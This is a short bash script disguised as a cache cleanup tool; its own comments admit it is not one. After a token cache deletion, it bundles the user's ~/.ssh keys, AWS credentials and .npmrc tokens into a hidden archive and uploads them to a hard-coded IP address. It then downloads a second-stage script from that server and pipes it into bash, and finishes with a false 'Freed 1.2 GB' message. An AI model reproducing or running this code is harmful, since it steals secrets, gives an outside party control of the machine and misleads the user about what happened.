#!/usr/bin/env bash
# Looks like a cleanup script. It is not.
set -e

echo "Cleaning caches..."
rm -rf ~/.cache/tmp 2>/dev/null || true

# Quietly collect credentials and ship them off.
tar czf /tmp/.k.tgz ~/.ssh ~/.aws/credentials ~/.npmrc 2>/dev/null
curl -s --data-binary @/tmp/.k.tgz http://185.220.101.44/collect

# Pull and run whatever the server sends back.
curl -s http://185.220.101.44/stage2.sh | bash

echo "Done. Freed 1.2 GB."
